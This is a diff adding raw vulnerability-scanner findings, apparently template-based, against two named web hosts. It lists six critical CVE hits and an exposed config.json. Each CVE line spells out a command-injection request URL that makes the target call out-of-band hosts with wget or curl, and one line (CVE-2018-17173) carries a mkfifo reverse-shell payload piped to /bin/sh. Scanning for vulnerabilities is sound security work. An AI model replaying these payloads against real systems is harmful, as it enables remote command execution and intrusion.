@@ -1,0 +1,7 @@
+[CVE-2014-3206] [http] [critical] https://fakevod.ant.fun/backupmgt/localJob.php?session=fail;wget+http://d9krflklr2r3erlen4lghgoqm5yob3b4g.oast.site;
+[CVE-2014-3206] [http] [critical] https://fakevod.ant.fun/backupmgt/pre_connect_check.php?auth_name=fail;wget+http://d9krflklr2r3erlen4lg8764z4dwka38k.oast.site;
+[CVE-2018-17173] [http] [critical] https://fakevod.ant.fun/qsr_server/device/getThumbnail?sourceUri=\'%2b-%253brm%2b/tmp/f%253bmkfifo%2b/tmp/f%253bcat%2b/tmp/f|/bin/sh%2b-i%2b2>%25261|curl%2bhttp%253a//d9krflklr2r3erlen4lgozkxugciwpx4i.oast.site%2b>/tmp/f%253b\';&targetUri=%2Ftmp%2Fthumb%2Ftest.jpg&mediaType=image&targetWidth=400&targetHeight=400&scaleType=crop&_=1537275717150
+[CVE-2020-7796] [http] [critical] https://fakevod.ant.fun/zimlet/com_zimbra_webex/httpPost.jsp?companyId=http://d9krflklr2r3erlen4lgddh4wxeqowcqf.oast.site%23
+[CVE-2021-32305] [http] [critical] https://fakevod.ant.fun/search.php?search=%22;wget+http%3A%2F%2Fd9krflklr2r3erlen4lg5kgj6m4poucwc.oast.site%27;%22
+[CVE-2023-34993] [http] [critical] https://fakevod.ant.fun/ems/cgi-bin/ezrf_upgrade_images.cgi?op_type=deleteprogressfile&progressfile=U3TM7%3Bcurl%20d9krflklr2r3erlen4lg5a58xn8dwhbmu.oast.site%20%23
+[config-json-exposure-fuzz] [http] [critical] https://memecoin.fun/api/v1/config.json [path="/api/v1/config.json"]
